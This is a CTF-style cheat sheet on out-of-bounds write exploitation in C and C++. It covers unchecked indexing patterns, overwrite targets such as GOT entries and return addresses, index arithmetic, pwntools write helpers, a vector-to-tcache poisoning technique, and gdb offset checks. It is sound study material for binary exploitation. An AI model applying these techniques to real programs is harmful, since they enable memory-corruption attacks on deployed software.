# OOB

## Bug Shapes

```c
arr[idx] = value;              // no bounds check
arr[(unsigned)idx] = value;    // signed/unsigned confusion
vec[idx] = value;              // std::vector operator[] no bounds check
buf[i + base] = value;         // base/index arithmetic bug
```

## Targets

```text
global auth flag
function pointer / vtable pointer
GOT entry when writable
saved return address / saved frame pointer
heap chunk size / fd / bk
adjacent object field
```

## Index Math

For qword arrays:

```python
idx = (target - array_base) // 8
```

For byte arrays:

```python
idx = target - array_base
```

For negative index before an array:

```python
idx = -((array_base - target) // 8)
```

## C++ Vector

Pattern:

```cpp
std::vector<long long> vec;
std::cin >> idx;
std::cin >> num;
vec[idx] = num;
```

`operator[]` does not check bounds. If `idx` is signed, try negative indexes.

```python
def edit(idx, value):
    io.sendlineafter(b"> ", b"2")
    io.sendlineafter(b"Idx: ", str(idx).encode())
    io.sendlineafter(b"New Num: ", str(value).encode())
```

## Vector To Tcache Poison

If a vector can write before its heap buffer, target per-thread tcache metadata, then trigger vector growth.

```python
fake_chunk = elf.sym["target"] - 8

edit(num_slots_idx, 1)
edit(entries_idx, fake_chunk)

# Next vector realloc/malloc returns fake_chunk.
add(0x67)
```

Derive offsets locally instead of guessing glibc layout:

```gdb
b *main+OFFSET_AFTER_FIRST_PUSH
run
p/x *(long long*)&vec
p/x tcache
ptype tcache
```

```python
def align(x, n):
    return (x + n - 1) & ~(n - 1)

vec_from_tcache = vec_start - tcache_addr
num_slots_idx = -vec_from_tcache // 8
entries_idx = (align(tcache_bins * count_size, 8) - vec_from_tcache) // 8
```

## Write Helpers

```python
def write_qword(target, value):
    idx = (target - array_base) // 8
    edit(idx, value)

def write_byte(target, value):
    idx = target - array_base
    edit(idx, value)
```

## Checks

```gdb
p/x &arr
p/x &target
x/20gx &arr
watch *(long long*)target
```
